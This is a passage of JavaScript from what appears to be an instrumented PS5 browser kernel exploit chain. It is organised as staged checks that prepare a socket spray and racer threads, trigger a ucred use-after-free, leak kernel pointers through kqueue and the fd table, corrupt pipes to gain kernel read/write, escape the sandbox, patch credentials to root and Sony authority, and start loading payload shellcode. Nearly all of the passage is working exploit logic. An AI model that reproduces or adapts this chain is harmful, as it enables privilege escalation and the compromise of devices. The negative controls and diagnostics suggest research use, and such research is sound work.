        perAttemptRt * a + perAttemptSys * b + PK.ATTEMPT_GAP_MS;
      const outer = cfg.attempts;
      X.measured.attemptCost = { perAttemptSys, perAttemptRt, perAttemptMs };

      note(
        "floor (chain cost only, no rendezvous or sleep latency): ~" +
          perAttemptSys +
          " syscalls in ~" +
          perAttemptRt +
          " round trips = ~" +
          perAttemptMs.toFixed(0) +
          " ms per failing stage-0 attempt",
      );

      const readMs = 9 * a + 190 * b;

      const RT_PER_BATCH = 3;
      const stage1Batches = PK.KQ_ROUNDS / PK.KQ_BATCH;
      const stage1Ms = stage1Batches * (RT_PER_BATCH * a + 2 * PK.KQ_BATCH * b);
      const stage2Ms = 7 * PK.KSLOW_ATTEMPTS * readMs + 2100;
      X.measured.stageCost = { readMs, stage1Ms, stage2Ms };
      note(
        "kread_slow ~" +
          readMs.toFixed(0) +
          " ms; 186 round trips ~" +
          (186 * a).toFixed(0) +
          " ms",
      );
      note(
        "stage 1 worst case (" +
          PK.KQ_ROUNDS +
          " rounds at batch " +
          PK.KQ_BATCH +
          " = " +
          stage1Batches +
          " batches x " +
          RT_PER_BATCH +
          " round trips): ~" +
          (stage1Ms / 1000).toFixed(1) +
          " s, bounded by " +
          (cfg.stage1DeadlineMs / 1000).toFixed(0) +
          " s of wall clock. " +
          "stage 2 (7 reads x up to " +
          PK.KSLOW_ATTEMPTS +
          " tries, " +
          "plus 2100 ms of nanosleep): ~" +
          (stage2Ms / 1000).toFixed(1) +
          " s.",
      );
      note(
        "stage 1 deadline " + (cfg.stage1DeadlineMs / 1000).toFixed(0) + " s",
      );

      note(
        "KQ_FDP 0xA8, FILEDESC_OFILES 0x00, FDESCENTTBL_HDR 0x08, " +
          "FILEDESCENT_SIZE 0x30",
      );
      note("kqueue magic 0x1430000 at chunk+0x08");

      if (cfg.netprobe) {
        note(
          "?netprobe=1: netcontrol(-1, SET_QUEUE, buf, 8) on a live " +
            "fd, then CLEAR_QUEUE on the same fd",
        );
        const b8 = E.alloc(8, "netprobe-buf");
        const s = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
        if (s.failed) {
          note("netprobe: could not create the probe socket");
        } else {
          track(s.s32);
          w32(b8.u8, 0, s.s32);
          flushMark("NETPROBE-SET-PRE", "fd=" + s.s32 + "-slot=-1");
          const r1 = await sys(
            PSYS.NETCONTROL,
            i64(0xffffffff, 0xffffffff),
            PK.NET_CONTROL_NETEVENT_SET_QUEUE,
            b8.base,
            8,
          );
          note(
            "netcontrol(-1, SET_QUEUE) -> " + r1.s32 + " (" + r1.errText + ")",
          );
          if (!r1.failed && r1.s32 === 0) {
            const r2 = await sys(
              PSYS.NETCONTROL,
              0,
              PK.NET_CONTROL_NETEVENT_CLEAR_QUEUE,
              b8.base,
              8,
            );
            note(
              "netcontrol(0, CLEAR_QUEUE, same live fd) -> " +
                r2.s32 +
                " (" +
                r2.errText +
                ")",
            );
            note("reachable");
          } else {
            note("not reachable from the WebProcess sandbox with slot -1");
          }
          await sys(PSYS.CLOSE, s.s32);
          untrack(s.s32);
        }
      } else {
        note("?netprobe=1 not set, netcontrol not called");
      }

      if (cfg.trigger === "none") note("trigger: none");
      else if (cfg.trigger === "netcontrol")
        note(
          "trigger: netcontrol -- " +
            "SET_QUEUE/CLEAR_QUEUE around " +
            "an fd-number reuse, then close(dup(uaf_socket)) as each " +
            "crfree. outer loop " +
            PK.NETCTRL_ATTEMPTS,
        );
      else
        note(
          "trigger: overflow -- " +
            "probes the fd budget, setuid(1) (irreversible), " +
            "burns kqueueex references to wrap cr_ref, builds a " +
            "pool of up to " +
            PK.FREE_FDS_CAP +
            " fds whose close() " +
            "is the crfree. attempts " +
            PK.TRIPLEFREE_ATTEMPTS +
            ". burn=" +
            cfg.burn +
            ".",
        );
      if (cfg.trigger === "overflow")
        note(
          "R_ESTIMATE = 83 (p2jb.js:1058) is the netflix app's " +
            "fd/thread count, not ours",
        );

      return PASS(
        "stubs and gadgets complete; core " +
          driver.core +
          " from the inherited mask 0x" +
          word.toString(16) +
          "; chain.run() = " +
          a.toFixed(2) +
          " ms + " +
          (b * 1000).toFixed(1) +
          " us/syscall; one failing stage-0 " +
          "attempt ~" +
          perAttemptMs.toFixed(0) +
          " ms, " +
          outer +
          " of them ~" +
          ((perAttemptMs * outer) / 1000).toFixed(1) +
          " s; one kread_slow ~" +
          readMs.toFixed(0) +
          " ms",
      );
    },
  });

  L.push({
    key: "ps1_prepare",
    label: "prepare_fds -- every resource stage 0 needs",
    cls: "state",
    async run() {
      const wasRace = X.setRaceMode(true);
      try {
        const lr = await latch.set(
          "ps1: opening " +
            cfg.sockets +
            " ipv6 sockets, 2 socketpairs, 2 pipes and 12 racer threads " +
            "in this WebProcess; trigger=" +
            cfg.trigger,
        );
        if (!lr.set)
          return FAIL(
            "one-shot latch did not take (" +
              (lr.detail || "?") +
              "); nothing has been changed yet",
          );

        const pr = await H.writeRtprio(
          TK.PRI_REALTIME,
          TK.POOPS_RTPRIO,
          "driver",
        );
        driver.prioChanged = true;
        if (pr.failed)
          return FAIL(
            "rtprio_thread(RTP_SET, realtime/256) on " +
              "the driver failed: " +
              pr.errText,
          );
        const pb = await H.readRtprio("driver-check");
        if (pb.type !== TK.PRI_REALTIME || pb.prio !== TK.POOPS_RTPRIO)
          return FAIL("driver rtprio read back " + pb.type + "/" + pb.prio);
        const pin = await H.pinDriver(driver.core);
        driver.affChanged = true;
        if (pin.failed)
          return FAIL(
            "pinning the driver to core " +
              driver.core +
              " failed: " +
              pin.errText,
          );
        const back = await H.readAffinity("driver-pin-check");
        if (r32(back.bytes, 0) !== (1 << driver.core) >>> 0)
          return FAIL(
            "driver affinity read back 0x" +
              r32(back.bytes, 0).toString(16) +
              ", not 0x" +
              ((1 << driver.core) >>> 0).toString(16),
          );
        driver.pinned = true;
        note(
          "driver: PRI_REALTIME/256 set and read back, pinned to core " +
            driver.core +
            " and read back",
        );

        E.buildBuffers();
        note(
          "recvmsg iovec array is " +
            PK.MSG_IOV_NUM +
            " x " +
            PK.IOV_SIZE +
            " = " +
            PK.MSG_IOV_NUM * PK.IOV_SIZE +
            " bytes with iov[0] = {base:1, len:1}",
        );
        note(
          "uio geometry: sizeof(struct uio) 0x30 + UIO_IOV_COUNT(" +
            PK.UIO_IOV_COUNT +
            ") x 0x10 = 0x170 == MSG_IOV_NUM(" +
            PK.MSG_IOV_NUM +
            ") x 0x10 = 0x170; 0x168 shares that bucket",
        );

        const [ia, ib] = await E.socketpairUnix("iov");
        const [ua, ub] = await E.socketpairUnix("uio");
        E.setSocketpairs(ia, ib, ua, ub);
        const [mr, mw] = await E.pipe2Nonblock("master");
        const [vr, vw] = await E.pipe2Nonblock("victim");
        E.setPipes(mr, mw, vr, vw);
        note(
          "master pipe r=" +
            mr +
            " w=" +
            mw +
            ", victim pipe r=" +
            vr +
            " w=" +
            vw,
        );

        await E.setupRacerGroups(driver.core);
        const sp = await E.spawnRacers(driver.core);
        note(
          "racers: " +
            sp
              .map((s) => s.name + "=" + s.live + " in " + s.ms + " ms")
              .join(", ") +
            " -- all pinned to core " +
            driver.core +
            " at PRI_REALTIME/" +
            TK.POOPS_RTPRIO +
            ", " +
            "pinret/affret/prioret/lookupret and sceKernelGetCurrentCpu " +
            "read back",
        );

        const so = await TW.openSockets(cfg.sockets);
        if (so.opened < 4)
          return FAIL("only " + so.opened + " IPv6 sockets: " + so.stoppedAt);
        if (so.opened < cfg.sockets)
          note(
            "opened " +
              so.opened +
              "/" +
              cfg.sockets +
              " (" +
              so.stoppedAt +
              ")",
          );
        TW.buildSprayBank(TW.S.n);
        const shape = TW.measureShape(TW.S.n);
        X.measured.shape = shape;
        note(
          "spray bank: " +
            TW.S.n +
            " pre-tagged 360-byte headers, one " +
            "per socket; " +
            shape.calls +
            " syscalls = " +
            shape.perAttempt +
            " chain slots; usable " +
            "region " +
            shape.capacity +
            " slots.",
        );

        await E.sleepK(PK.SETTLE_AFTER_BANK_MS);

        if (TW.S.dupCount)
          return FAIL(
            "socket bank holds " +
              TW.S.dupCount +
              " duplicate descriptor(s): " +
              TW.S.n +
              " slots, " +
              (TW.S.n - TW.S.dupCount) +
              " distinct fds",
          );

        await TW.runTwinBatch(1, TW.S.n, 0, null);
        const probes = [0, Math.floor(TW.S.n / 2), TW.S.n - 1];
        const bad = [];
        for (const idx of probes) {
          const fh = await TW.readFullHeader(idx);
          if (fh.failed) {
            bad.push(idx + "=err");
            continue;
          }
          if (fh.outLen !== PK.UCRED_SIZE) bad.push(idx + "=len" + fh.outLen);
          else if (!fh.tagOk) bad.push(idx + "=tag0x" + fh.tag.toString(16));
        }
        if (bad.length)
          return FAIL("bank is not in the 0x168 size class: " + bad.join(","));
        note(
          "size class proven on sockets " +
            probes.join(",") +
            ": getsockopt copied out exactly 0x" +
            PK.UCRED_SIZE.toString(16) +
            " bytes with the right tag at +0x04.",
        );

        let pf = null;
        if (cfg.trigger === "overflow") {
          pf = await E.prepareFds({
            mode: cfg.burn,
            core: driver.core,
            probeRounds: cfg.burnRounds,
            unroll: cfg.burnUnroll,
          });
          note(
            "prepare_fds(" +
              cfg.burn +
              "): fd_budget=" +
              pf.fdBudget +
              ", free_fds_num=" +
              pf.freeFdsNum +
              ", kqueueex(0x800000000000) returned " +
              pf.kqueueexRet +
              ", " +
              pf.burnSyscalls +
              " burn calls in " +
              pf.burnMs +
              " ms, fd delta " +
              pf.fdDelta +
              ". " +
              (pf.why || ""),
          );
          if (pf.fdDelta > 0)
            note(
              "kqueueex consumed " +
                pf.fdDelta +
                " descriptor(s) " +
                "across the burn",
            );
          if (!pf.ok) return FAIL("prepare_fds: " + pf.why);
          if (pf.plannedRounds !== undefined && cfg.burn === "full")
            note(
              "burn budget: " +
                pf.leaked +
                " references leaked (" +
                pf.burnRounds +
                " rounds x " +
                PK.LEAK_UNROLL +
                " unrolled, per-worker queue " +
                (pf.queued || []).join("/") +
                ", plus a " +
                pf.tailIssued +
                "-call tail from the " +
                "driver's own chain) plus " +
                pf.freeFdsNum +
                " pool " +
                "crholds = 0x100000001, cr_ref = R+1",
            );
          if (cfg.burn !== "full")
            note(
              "burn not run (burn=" +
                cfg.burn +
                "), cr_ref has not " +
                "wrapped and no free-fd pool exists",
            );
        }

        X.measured.prepare = { sockets: TW.S.n, racers: sp, prepareFds: pf };
        return PASS(
          TW.S.n +
            " IPv6 sockets in the 0x168 class, 12 racers on " +
            "core " +
            driver.core +
            " at RT/256 with every prologue read " +
            "back, 2 socketpairs, 2 pipes (master r=" +
            mr +
            " victim r=" +
            vr +
            "), " +
            shape.perAttempt +
            " slots per attempt" +
            (pf ? "; prepare_fds " + cfg.burn + " ok" : ""),
        );
      } finally {
        X.setRaceMode(wasRace);
      }
    },
  });

  L.push({
    key: "ps2_one_attempt",
    label: "one attempt_race, instrumented to the step",
    cls: cfg.trigger === "none" ? "negative control" : "BUG",
    hot: true,
    async run() {
      const pre = need("ps1_prepare", TW.S.n > 0 && E.S.buf);
      if (pre) return pre;

      if (cfg.trigger !== "none")
        return NA(
          "trigger=" +
            cfg.trigger +
            " is armed, ps3 owns " +
            "the attempt loop; " +
            cfg.attempts +
            " more here would stack a second " +
            "triple free on the first",
        );

      if (cfg.trigger === "none")
        flushMark("PS2-NEGATIVE-CONTROL", "no-crfree-will-be-issued");

      const attemptT0 = Date.now();
      const r = await E.attemptRace({
        twinDeadlineMs: cfg.twinDeadlineMs,
        reclaimDeadlineMs: cfg.reclaimDeadlineMs,
        tripletDeadlineMs: cfg.tripletDeadlineMs,
      });
      if (r && r.ms === undefined) r.ms = Date.now() - attemptT0;
      note(
        "reached step '" +
          r.step +
          "' of " +
          E.STEPS.length +
          ": " +
          E.STEPS.join(" -> "),
      );

      if (r.blockedAfterSignal !== undefined && r.blockedAfterSignal >= 0) {
        note(
          "after signal(), before the release byte, " +
            r.blockedAfterSignal +
            " of " +
            r.iovRacers +
            " iov " +
            "racers still blocked, " +
            r.awakeAfterSignal +
            " past the read() gate",
        );
        if (r.blockedAfterSignal === 0)
          return FAIL(
            "0 of " +
              r.iovRacers +
              " iov racers " +
              "blocked, no release byte written, no " +
              "368 byte iovec live in the kernel",
          );
      }
      if (r.recvmsgRet !== undefined && r.recvmsgRet !== null)
        note(
          "recvmsg returned " + r.recvmsgRet + " in the first flush " + "round",
        );
      if (r.twins)
        note(
          "twins " +
            r.twins.join(",") +
            " (fds " +
            r.twins.map((i) => TW.S.fds[i]).join(",") +
            ")",
        );
      if (r.reclaimRounds >= 0)
        note("reclaim loop ran " + r.reclaimRounds + " rounds");

      if (cfg.trigger === "none") {
        if (r.twins) {
          const forged = TW.bankForgeries();
          await latch.escalate(
            "ps2 negative control found a twin " +
              "with no trigger: sockets " +
              r.twins.join(",") +
              ". aliased chunk predates this run. " +
              "reboot.",
          );
          return FAIL(
            "twin found with no trigger (sockets " +
              r.twins.join(",") +
              "), alias predates this run" +
              (forged.length
                ? "; spray bank mis-tagged (" +
                  forged.join(" ") +
                  "), may be a page bug"
                : "; spray bank is canonical") +
              ". sockets left open, reboot",
          );
        }

        if (r.ms !== undefined && r.ms !== null) {
          X.measured.attemptActualMs = r.ms;
          const floor = X.measured.attemptCost
            ? X.measured.attemptCost.perAttemptMs
            : 0;
          const worst = (r.ms * cfg.attempts) / 1000;
          note(
            "one failing attempt: " +
              r.ms +
              " ms" +
              (floor
                ? " (ps0 chain-cost floor " +
                  floor.toFixed(0) +
                  " ms, waiting is " +
                  (100 - (100 * floor) / r.ms).toFixed(0) +
                  "% of it)"
                : "") +
              ". stage 0 at " +
              cfg.attempts +
              " attempts is ~" +
              worst.toFixed(0) +
              " s worst case (" +
              (worst / 60).toFixed(1) +
              " min), every failing " +
              "attempt burning all " +
              PK.MAX_ROUNDS_TWIN +
              " scan rounds.",
          );

          const PREV_MS = 13910;
          const rt = X.measured.rt;

          const roundTrips =
            1 + 2 * PK.IOV_FLUSH_ROUNDS + 1 + PK.MAX_ROUNDS_TWIN;
          const rtCost = rt ? roundTrips * rt.a : 0;

          const haveWin = r.marksBlockedInWindow !== undefined;
          const winB = haveWin ? r.marksBlockedInWindow : -1;
          const winQ = haveWin ? r.marksQueuedInWindow : -1;
          const winMs = r.windowMs === undefined ? -1 : r.windowMs;
          let kind, head, why;
          if (!haveWin) {
            kind = "warn";
            head = "no measurement of the in-window marks";
            why =
              r.windowMs === undefined
                ? "attempt_race returned at step '" +
                  r.step +
                  "' before the window opened, " +
                  r.ms +
                  " ms not comparable with the " +
                  "13,910 ms baseline"
                : "the window ran " +
                  r.windowMs +
                  " ms, no markStats() accessor " +
                  "(poops.html:346-348), in-window " +
                  "blocking-mark count unknown; " +
                  r.ms +
                  " ms wall clock below still measured";
          } else if (r.ms > 1000) {
            kind = "bad";
            head = "diagnosis does not hold";
            why =
              "one attempt still costs " +
              r.ms +
              " ms, " +
              "prediction was 550-700 ms. " +
              (winB > 0
                ? winB +
                  " blocking mark(s) still issued " +
                  "inside the window; move them to the queue"
                : "no blocking marks inside the window");
          } else if (r.ms < 300) {
            kind = "warn";
            head = "suspiciously fast, not a pass";
            why =
              "one attempt took " +
              r.ms +
              " ms, below " +
              "the ~350 ms floor of " +
              roundTrips +
              " chain " +
              "round trips" +
              (rtCost
                ? " (" +
                  rtCost.toFixed(0) +
                  " ms at the " +
                  "measured " +
                  rt.a.toFixed(2) +
                  " ms each)"
                : "");
          } else {
            kind = "good";
            head = "diagnosis holds";

            why =
              "one attempt costs " +
              r.ms +
              " ms, inside the " +
              "300-1000 ms acceptance range (prediction was " +
              "550-700" +
              (r.ms >= 550 && r.ms <= 700
                ? ", " + "inside it"
                : ", outside the " + "prediction, still a pass") +
              ") and above the " +
              roundTrips +
              "-round-trip floor. window " +
              winMs +
              " ms, " +
              winQ +
              " queued mark(s), " +
              winB +
              " blocking.";
          }
          const line =
            "unarmed (?trigger=none) per-attempt wall " +
            "clock\n\n" +
            "    now      " +
            r.ms +
            " ms\n" +
            "    previous " +
            PREV_MS +
            " ms   (2026-08-08, " +
            "8 armed attempts)\n" +
            "    predicted 550-700 ms\n" +
            "    change   " +
            (r.ms > 0
              ? (PREV_MS / r.ms).toFixed(1) +
                "x faster (" +
                (PREV_MS - r.ms) +
                " ms removed)"
              : "?") +
            "\n" +
            "    in-window marks  " +
            (haveWin
              ? winQ + " queued / " + winB + " blocking"
              : "not measured, window never opened") +
            "\n\n" +
            head +
            ": " +
            why;
          if (X.verdictBanner) X.verdictBanner(kind, line);
          note(line);

          flushMark(
            "PS2-ATTEMPT-MS",
            "now=" +
              r.ms +
              "-prev=" +
              PREV_MS +
              "-predicted=550to700-verdict=" +
              kind +
              "-windowMs=" +
              winMs +
              "-windowQueued=" +
              winQ +
              "-windowBlocked=" +
              winB +
              "-roundTrips=" +
              roundTrips +
              "-rtFloorMs=" +
              rtCost.toFixed(0),
          );
          X.measured.telemetryVerdict = {
            kind,
            ms: r.ms,
            prev: PREV_MS,
            windowQ: winQ,
            windowB: winB,
          };
        }

        const tv = X.measured.telemetryVerdict;
        return PASS(
          (r.ms !== undefined && r.ms !== null
            ? "one attempt: " +
              r.ms +
              " ms" +
              (tv ? " (" + tv.kind + ")" : "") +
              ", in-window marks " +
              (tv ? tv.windowQ : "?") +
              " queued / " +
              (tv ? tv.windowB : "?") +
              " blocking. "
            : "") +
            "negative control: attempt_race reached '" +
            r.step +
            "' with no twin in " +
            PK.MAX_ROUNDS_TWIN +
            " rounds. " +
            (r.ms !== undefined && r.ms !== null
              ? cfg.attempts +
                " attempts is ~" +
                ((r.ms * cfg.attempts) / 60000).toFixed(1) +
                " min. "
              : "") +
            r.detail,
        );
      }

      if (r.ok)
        if (r.ok)
          return PASS(
            "one attempt succeeded: " +
              r.detail +
              ". three sockets share one 360 byte chunk, reboot when done",
          );
      return FAIL("attempt_race stopped at '" + r.step + "': " + r.detail);
    },
  });

  L.push({
    key: "ps3_stage0",
    label: "stage 0 -- the attempt loop",
    cls: cfg.trigger === "none" ? "negative control" : "BUG",
    hot: true,
    async run() {
      const pre = need("ps1_prepare", TW.S.n > 0 && E.S.buf);
      if (pre) return pre;
      if (TW.tripletsValid())
        return PASS(
          "ps2 already produced a valid triplet (" +
            TW.S.triplets.join(",") +
            "); re-entering attempt_race would free over a live alias",
        );
      if (TW.corrupt)
        return FAIL("refused: an alias exists (" + TW.corrupt + ")");

      const r = await E.stage0({
        attempts: cfg.attempts,
        deadlineMs: cfg.stage0DeadlineMs,
        twinDeadlineMs: cfg.twinDeadlineMs,
        reclaimDeadlineMs: cfg.reclaimDeadlineMs,
        tripletDeadlineMs: cfg.tripletDeadlineMs,
      });
      for (const line of r.log.slice(-8)) note(line);
      if (r.last && r.last.blockedAfterSignal >= 0)
        note(
          "last attempt: " +
            r.last.blockedAfterSignal +
            " of " +
            r.last.iovRacers +
            " iov racers still blocked in " +
            "recvmsg after signal(), before the release byte",
        );
      X.measured.stage0 = { attempts: r.attempts, ms: r.ms, ok: r.ok };
      note(
        "stage 0: " +
          r.attempts +
          " attempts in " +
          r.ms +
          " ms = " +
          (r.ms / Math.max(1, r.attempts)).toFixed(0) +
          " ms/attempt. " +
          "crfrees issued: " +
          E.S.crfrees +
          (cfg.trigger === "overflow"
            ? "; free_fd_idx " + E.S.freeFdIdx + "/" + E.S.freeFds.length
            : ""),
      );

      if (cfg.trigger === "none") {
        if (r.ok || TW.corrupt)
          return FAIL(
            "negative control produced an alias, " +
              "nothing here freed a ucred. reboot.",
          );
        return PASS(
          "negative control: " +
            r.attempts +
            " attempt(s), " +
            r.ms +
            " ms, no twin and no triplet. " +
            (r.ms / Math.max(1, r.attempts)).toFixed(0) +
            " ms per attempt",
        );
      }
      if (r.ok)
        return PASS(
          "stage 0 ok on attempt " +
            r.attempts +
            "/" +
            cfg.attempts +
            " in " +
            r.ms +
            " ms, triplets " +
            TW.S.triplets.join(",") +
            " (fds " +
            TW.S.triplets.map((i) => TW.S.fds[i]).join(",") +
            "). reboot when done",
        );
      return FAIL(
        "stage 0 failed after " +
          r.attempts +
          " attempts (" +
          r.ms +
          " ms): " +
          (r.why || "?") +
          (E.triggered
            ? ". trigger fired but no alias found; reboot"
            : ". nothing was freed"),
      );
    },
  });

  L.push({
    key: "ps4_validate",
    label: "validate the triplet independently of the scan",
    cls: "evidence",
    async run() {
      const na = needTrigger("validate");
      if (na) return na;
      if (!TW.tripletsValid())
        return FAIL(
          "no valid triplet to validate (triplets=" +
            TW.S.triplets.join(",") +
            ") but the trigger fired",
        );
      const [t0, t1, t2] = TW.S.triplets;
      if (t0 === t1 || t0 === t2 || t1 === t2)
        return FAIL("triplet members are not pairwise distinct");

      const sizes = [];
      const tags = [];
      for (const idx of [t0, t1, t2]) {
        const fh = await TW.readFullHeader(idx);
        if (fh.failed)
          return FAIL("readFullHeader(" + idx + ") failed: " + fh.errText);
        sizes.push(idx + ":len=" + fh.outLen + ",tag=0x" + fh.tag.toString(16));
        tags.push(fh.tag >>> 0);
        if (fh.outLen !== PK.UCRED_SIZE)
          return FAIL(
            "socket " +
              idx +
              " reads back " +
              fh.outLen +
              " bytes, not 0x" +
              PK.UCRED_SIZE.toString(16) +
              ", chunk left the ucred size class",
          );
      }
      note("size class holds on all three: " + sizes.join("  "));

      if (!(tags[0] === tags[1] && tags[1] === tags[2]))
        return FAIL(
          "the three members disagree on +0x04: " +
            sizes.join("  ") +
            "; " +
            tags.length +
            " different tags, " +
            "alias not reproducible",
        );
      const owner = tags[0] & 0xffff;
      return PASS(
        "sockets " +
          t0 +
          ", " +
          t1 +
          " and " +
          t2 +
          " each copy out 0x" +
          PK.UCRED_SIZE.toString(16) +
          " bytes and all read tag 0x" +
          tags[0].toString(16) +
          ", written by socket " +
          owner +
          ". read-only check",
      );
    },
  });

  L.push({
    key: "ps5_stage1",
    label: "stage 1 -- kqueue reclaim, proc_filedesc, triplet repair",
    cls: "BUG",
    hot: true,
    async run() {
      const na = needTrigger("read through");
      if (na) return na;
      if (!TW.tripletsValid())
        return FAIL(
          "stage 1 needs three live aliases; triplets=" +
            TW.S.triplets.join(","),
        );
      const r = await E.stage1({
        kqBatch: cfg.kqBatch,
        rounds: cfg.kqRounds,
        deadlineMs: cfg.stage1DeadlineMs,
        repairDeadlineMs: cfg.repairDeadlineMs,
        confirm: cfg.kqConfirm,
      });
      note(
        "kqueue rounds " +
          r.rounds +
          ", opened " +
          r.kqOpened +
          ", closed " +
          r.kqClosed +
          ", hits " +
          r.hits.length +
          ", copyout lengths seen " +
          r.outLens.join(","),
      );
      if (r.hits.length)
        note(
          "signature: the 32-bit form (0x" +
            PK.KQ_SIGNATURE.toString(16) +
            ", poops_ps5.lua:737) held; " +
            "the 64-bit form (poops.c:793) " +
            (r.sig64 ? "also held" : "did not hold"),
        );
      if (!r.ok) return FAIL("stage 1: " + r.why);

      if (r.independent)
        note(
          "two independent kqueues report the same kq_fdp, " +
            "batches " +
            r.batches.join(" and ") +
            " agree",
        );
      else
        note(
          "only one kqueue landed (batch " +
            r.batches.join(",") +
            (r.confirmGaveUp
              ? "; the confirm search spent its " + "extra-round budget"
              : "") +
            "), proc_filedesc on range checks alone",
        );
      note(
        "readback cells re-zeroed, optlen 256, counted at 0x" +
          PK.KQ_MIN_OUTLEN.toString(16) +
          " bytes",
      );

      const k1 = await E.kslow64(
        E.S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES),
        "ps5:fd_files#1",
        { repairDeadlineMs: cfg.repairDeadlineMs },
      );
      if (!k1.ok)
        return FAIL(
          "proc_filedesc " +
            hx(r.fdp) +
            " passes, but " +
            "kread_slow could not read fdp->fd_files: " +
            k1.log.join(" | "),
        );
      const k2 = await E.kslow64(
        E.S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES),
        "ps5:fd_files#2",
        { repairDeadlineMs: cfg.repairDeadlineMs },
      );
      if (!k2.ok)
        return FAIL(
          "the second read of fdp->fd_files failed: " + k2.log.join(" | "),
        );
      if (k1.value.low !== k2.value.low || k1.value.hi !== k2.value.hi)
        return FAIL(
          "kread_slow not repeatable: fdp->fd_files read " +
            hx(k1.value) +
            " then " +
            hx(k2.value) +
            ", one of the two is fabricated",
        );
      note("fd_files read twice, " + hx(k1.value) + " both times");
      note(
        "leaked_iov (chunk kva + 0x30) is " +
          hx(E.S.leakedIovFirst) +
          ", asserted byte-identical on " +
          "every later kread_slow",
      );

      return PASS(
        "proc_filedesc = " +
          hx(r.fdp) +
          " from a " +
          r.winnerOutLen +
          " byte copyout" +
          (r.independent
            ? ", confirmed by two kqueues (" + r.batches.join(",") + ")"
            : ", single kqueue, not cross-checked") +
          ", triplets " +
          TW.S.triplets.join(",") +
          ", fd_files = " +
          hx(k1.value),
      );
    },
  });

  L.push({
    key: "ps6_stage2",
    label: "stage 2 -- the fd-table walk to two struct pipe pointers",
    cls: "BUG",
    hot: true,
    async run() {
      const na = needTrigger("leak through");
      if (na) return na;
      if (!E.S.procFiledesc) return FAIL("stage 2 needs proc_filedesc");
      if (!TW.tripletsValid())
        return FAIL(
          "stage 2 needs three live aliases; triplets=" +
            TW.S.triplets.join(","),
        );
      const r = await E.stage2({
        attempts: cfg.stage2Attempts,
        repairDeadlineMs: cfg.repairDeadlineMs,
        deadlineMs: cfg.stage2DeadlineMs,
      });
      for (const s of r.steps) note(s);
      if (!r.ok)
        return FAIL(
          "stage 2 (attempt " +
            r.attempt +
            " of " +
            cfg.stage2Attempts +
            "): " +
            r.why,
        );

      const vals = [
        ["fd_ofiles", E.S.fdOfiles],
        ["master_fp", E.S.masterFp],
        ["victim_fp", E.S.victimFp],
        ["master_pipe", E.S.masterPipeData],
        ["victim_pipe", E.S.victimPipeData],
      ];
      for (const [nm, v] of vals) {
        if (!isKernelPtr(v))
          return FAIL(nm + " = " + hx(v) + " is not canonical");
        if (!isAligned8(v))
          return FAIL(nm + " = " + hx(v) + " is not 8-aligned");
        if (isZero64(v)) return FAIL(nm + " is zero");
      }
      note(
        "all five pointers canonical kernel VAs (>>48 == 0xFFFF) " +
          "and 8-aligned",
      );
      if (E.S.nfiles > 0)
        note(
          "fdt_nfiles = " +
            E.S.nfiles +
            " and both fds (" +
            E.S.masterRfd +
            ", " +
            E.S.victimRfd +
            ") are inside it",
        );
      note("master_fp != victim_fp AND master_pipe != victim_pipe");
      if (r.recheckOk)
        note(
          "S2.7: fdescenttbl re-read at the end of the walk, " +
            "matches the value the walk started from",
        );
      else
        note(
          "S2.7 did not run: fdescenttbl re-read failed, single " +
            "unrepeated read of the fd table base",
        );
      note("the two pipe pointers are retained in-process as Stage 3 input");

      return PASS(
        "fd_ofiles = " +
          hx(E.S.fdOfiles) +
          ", master_fp = " +
          hx(E.S.masterFp) +
          ", victim_fp = " +
          hx(E.S.victimFp) +
          ", master_pipe = " +
          hx(E.S.masterPipeData) +
          ", victim_pipe = " +
          hx(E.S.victimPipeData) +
          " (" +
          E.S.kreadOk +
          "/" +
          E.S.kreadCalls +
          " kread_slow)",
      );
    },
  });

  L.push({
    key: "ps8_stage3",
    label: "stage 3 -- pipe corruption, kernel R/W, self-test, repair",
    cls: "BUG",
    hot: true,
    async run() {
      const na = needTrigger("write through");
      if (na) return na;
      if (!E.S.masterPipeData || !E.S.victimPipeData)
        return FAIL(
          "stage 3 needs stage 2's two struct pipe pointers " +
            "(master=" +
            hx(E.S.masterPipeData) +
            " victim=" +
            hx(E.S.victimPipeData) +
            ")",
        );

      const r = await E.stage3({
        loopDeadlineMs: cfg.kreadLoopDeadlineMs || 30000,
        repairDeadlineMs: cfg.repairDeadlineMs || 20000,
      });
      for (const st of r.steps) note(st);

      if (!r.ok) return FAIL("stage 3: " + r.why);

      const rt = r.readTest,
        wt = r.writeTest;
      const pid =
        rt.pid && !rt.pid.skipped
          ? "read test B (pid): curproc=" +
            rt.pid.curproc +
            ", curproc->p_pid reads " +
            rt.pid.kernelPid +
            " and getpid() independently says " +
            rt.pid.userlandPid +
            ", reached through kernel memory. "
          : "read test B (pid) skipped (" +
            (rt.pid ? rt.pid.skipped : "?") +
            "); test A alone carries the verdict. ";
      return PASS(
        "kernel r/w ok. cross-read at " +
          rt.cross.addr +
          ": fast " +
          rt.cross.fast +
          ", slow " +
          rt.cross.slow +
          ". " +
          pid +
          "write: f_count fd " +
          wt.fd +
          " " +
          wt.before +
          " -> " +
          wt.after +
          ". cleanup: " +
          r.cleanup.rthdrCleared +
          "/3 rthdr cleared, " +
          r.cleanup.uafRemoved +
          " uaf slot(s), " +
          E.S.kernelWrites +
          " kernel writes",
      );
    },
  });

  L.push({
    key: "ps9_stage4",
    label: "stage 4 -- sandbox escape, root, Sony authority",
    cls: "BUG",
    hot: true,
    async run() {
      const na = needTrigger("patch credentials through");
      if (na) return na;
      if (!E.S.aliasesRepaired)
        return FAIL(
          "stage 4 needs stage 3's repair certified " +
            "first; three sockets still alias " +
            "one freed chunk",
        );

      const r = await E.stage4({});
      for (const st of r.steps) note(st);
      if (!r.ok) return FAIL("stage 4: " + r.why);

      return PASS(
        "uid " +
          r.before.uid +
          " -> " +
          r.after.uid +
          ", getuid()=" +
          r.after.getuid +
          ", rdir/jdir " +
          r.after.rdir +
          ", authid " +
          r.after.authid +
          (r.authOk ? "" : " (not the value written)") +
          ", " +
          E.S.kernelWrites +
          " kernel writes",
      );
    },
  });

  L.push({
    key: "ps10_stage5", label: "stage 5 -- load elfldr + run the kexp shellcode",
    cls: "PAYLOAD", hot: true,
    async run() {
      const mode = String(cfg.payload || "");
      if (mode !== "1" && mode !== "dry") return NA("stage 5 runs a payload, opt-in only");
      if (!E.S.jailbroken) return FAIL("stage 5 needs stage 4's jailbreak (getuid()==0); " +
        "jitshm_create and an RWX mmap need it",);
      const r = await E.stage5({ dryRun: mode === "dry" });
